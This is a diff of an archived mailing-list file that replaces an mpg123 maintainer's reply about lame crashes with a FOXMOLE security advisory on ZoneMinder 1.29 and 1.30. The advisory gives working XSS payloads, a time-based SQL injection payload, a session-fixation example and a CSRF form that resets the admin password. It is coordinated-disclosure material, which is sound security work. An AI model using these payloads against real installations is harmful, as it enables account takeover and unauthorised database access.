@@ -1,42 +1,139 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/28/13
-Message-ID: <20170628154335.4f06da8b@cortex.rrz.uni-hamburg.de>
-Date: Wed, 28 Jun 2017 15:43:35 +0200
-From: "Dr. Thomas Orgis" <thomas.orgis@...-hamburg.de>
-To: oss-security@...ts.openwall.com
-Subject: Re: lame: multiple vulnerabilities
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/02/18
+Message-ID: <ad74ed31-dcff-24b7-ae84-2421ad10b7ef@foxmole.com>
+Date: Thu, 2 Feb 2017 10:08:30 +0100
+From: FOXMOLE Advisories <advisories@...mole.com>
+To: fulldisclosure@...lists.org, bugtraq@...urityfocus.com, bugs@...uritytracker.com, submissions@...ketstormsecurity.org, oss-security@...ts.openwall.com
+Subject: [FOXMOLE SA 2016-07-05] ZoneMinder - Multiple Issues
 Content-Type: text/plain; charset=utf-8
 
-Am Wed, 28 Jun 2017 14:03:16 +0200
-schrieb Agostino Sarubbo <ago@...too.org>:
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-> I discovered some crashes (which will follow one-by-one) in lame.
+=== FOXMOLE - Security Advisory 2016-07-05 ===
 
-A number of these occur inside the mpglib part, which is an old fork of
-the mpg123 decoder (extended with some LAME specifics). Can you check
-if they also occur in current mpg123 / libmpg123 (https://mpg123.org)?
+Zoneminder multiple vulnerabilities
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-As mpg123 upstream, I've got that long-term plan without much actual
-real-world time to spend on it to finally replace those old forks of
-the precursor to libmpg123. A number of vulnerabilities in lame's
-mpglib might be a good trigger to finally consolidate this.
+Affected Versions
+=================
+Zoneminder 1.29,1.30
 
-In any case, knowing if these crashes apply to mpg123/libmpg123 would
-be very valuable for me. 
+Issue Overview
+==============
+Vulnerability Type: SQL Injection, Cross Site Scripting, Session Fixation, No CSRF Protection
+Technical Risk: high
+Likelihood of Exploitation: medium
+Vendor: Zoneminder
+Vendor URL: https://zoneminder.com/
+Credits: FOXMOLE employee Tim Herres
+Advisory URL: https://www.foxmole.com/advisories/foxmole-2016-07-05.txt
+Advisory Status: Public
+CVE-Number: NA
+CVE URL: NA
+OVE-ID:
+OVI-ID:
+CWE-ID: CWE-89
+CVSS 2.0: 4.3 (AV:N/AC:M/Au:N/C:P/I:N/A:N)
 
-Oh, and lame upstream is not exactly dead, just very silent. Apart from
-these vulnerabilities, the program is quite complete in its
-functionality. There is still a the lame-dev@...ts.sourceforge.net
-mailing list with a post from time to time. At least developers are
-subscribed.
+
+Impact
+======
+During an internal code review multiple vulnerabilities were identified.
+The whole application misses input validation and output encoding.
+This means user supplied input is inserted in an unsafe way.
+This could allow a remote attacker to easily compromise user accounts or access the database in an unsafe way.
+
+Issue Description
+=================
+The following findings are only examples there are quite more. The whole application should be reviewed.
+
+All items tested using Firefox
+
+1)Cross Site Scripting (XSS)
+Reflected:
+http://192.168.241.131/zm/index.php?view=request&request=log&task=download&key=a9fef1f4&format=texty9fke%27%3Chtml%3E%3Chead%3E%3C/head%3E%3Cbody%3E%3Cscript%3Ealert(1)%3C%2fscript%3E%3C/body%3E%3C/html%3Eayn2h
+Reflected without authentication: http://192.168.241.131/zm/index.php/LSE4%22%3E%3Cscript%3Ealert(1)%3C/script%3ELSE
+Stored: Creating a new monitor using the name "Bla<script>alert(1)</script>". There is only a clientside protection.
+
+2)SQL Injection
+Example Url:http://192.168.241.131/zm/index.php
+Parameter: limit (POST)
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)
+    Payload: view=request&request=log&task=query&limit=100;(SELECT *
+FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434
+Easy exploitable using sqlmap.
+
+3)Session Fixation
+After a successful authentication the Session Cookie ZMSESSID remains the same.
+Example: Cookie before the login = ZMSESSID=26ga0i62e4e51mhfcb68nk3dg2 after successful login
+ZMSESSID=26ga0i62e4e51mhfcb68nk3dg2
+
+4)No CSRF Proctection
+A possible CSRF attack form, which changes the password of the admin (uid=1), if the corresponding user activates it.
+<html>
+  <body>
+    <form action="http://192.168.241.131/zm/index.php" method="POST">
+      <input type="hidden" name="view" value="user" />
+      <input type="hidden" name="action" value="user" />
+      <input type="hidden" name="uid" value="1" />
+      <input type="hidden" name="newUser&#91;MonitorIds&#93;" value="" />
+      <input type="hidden" name="newUser&#91;Username&#93;" value="admin" />
+      <input type="hidden" name="newUser&#91;Password&#93;"
+value="admin1" />
+      <input type="hidden" name="conf&#95;password" value="admin1" />
+      <input type="hidden" name="newUser&#91;Language&#93;" value="" />
+      <input type="hidden" name="newUser&#91;Enabled&#93;" value="1" />
+      <input type="hidden" name="newUser&#91;Stream&#93;" value="View" />
+      <input type="hidden" name="newUser&#91;Events&#93;" value="Edit" />
+      <input type="hidden" name="newUser&#91;Control&#93;" value="Edit" />
+      <input type="hidden" name="newUser&#91;Monitors&#93;" value="Edit" />
+      <input type="hidden" name="newUser&#91;Groups&#93;" value="Edit" />
+      <input type="hidden" name="newUser&#91;System&#93;" value="Edit" />
+      <input type="hidden" name="newUser&#91;MaxBandwidth&#93;" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
 
 
-Alrighty then,
 
-Thomas (mpg123 maintainer)
+Temporary Workaround and Fix
+============================
+FOXMOLE advises to disable Zoneminder until the vendor publishes a complete fix.
 
--- 
-Dr. Thomas Orgis
-Universität Hamburg
 
-Download attachment "smime.p7s" of type "application/pkcs7-signature" (4967 bytes)
+
+History
+=======
+2016-07-05  Issue discovered
+2016-11-22  Vendor contacted, no response
+2016-12-16  Vendor contacted again, still no response
+2017-01-17  Vendor contacted --> working on a patch
+2017-01-22  Vendor contacted, asked for an update and
+            declare advisory release to 2017-02-02 --> no response
+2017-02-02  Advisory Release
+
+
+GPG Signature
+=============
+This advisory is signed with the GPG key of the FOXMOLE advisories team.
+The key can be downloaded here: https://www.foxmole.com/advisories-key-3812092199E3277C.asc
+
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCAAdFiEEjrQMZqTYqiY2IftqOBIJIZnjJ3wFAliS9w0ACgkQOBIJIZnj
+J3yAyhAA0EuT6UjSTVeK5V1nWgmzez9mLTHSfzykzDa+seGUArUjb7dOnqQ6C9O0
+21FKxIOOfBdK+CpuqAk0fm5P5CN9jFLqzTuh7+JLdWA8FDpEQdGIZD3iP6DEAh1q
+4e78ZA30u18imdtDjxBUO+cfgJPLFwIEr+cn7eEiIn+spW9Bd5g1RJEOAZT91feO
+o2rwBz917qRCWKa5I+RqSZj+5Ax4LFiVrvZDgMkihlb4Nvfrpg8ewBQfoATfyqF6
+j0ceZBKjLU3aEq4EE9ZvnbuzVLEraiZ+3xDwXdjF0BRKYS6XgRL2xWgr4ldsQ6sS
+glDyyU8QH8eh5UVAswebx9fKVARmog+34dX/ESJieI7A7s6N05IGpFrRcHPpjhRL
+Y3lNWj5+eSvpRSxf7pb9+KdTd8pZhgKK+MY+GulVIb8xtYYGvdju58Lmu23urV8v
+TuHwMOHsHtOzMRr1C8Z47EdTaUm8GsCqoeO8Z4L6ERg/ZZAuQqES26lLpQtCfMze
+HuGHkGGKVUi5s7BSMQqXiUNc3xipA39b0uqHw9OQpRRUixGl4rvAXTeYx6yBdiib
+tmi3/Oph6kWQjuFFhiFC8zrjJhmEtOLc4O+BweKx/WfgWQQ8JPCsznpD2J3ln8XD
+0lP0yuSO0CaJptLioYJhPr+m2SmGxY4rxSuu1cdrOJZfv9QkiLw=
+=/QtX
+-----END PGP SIGNATURE-----
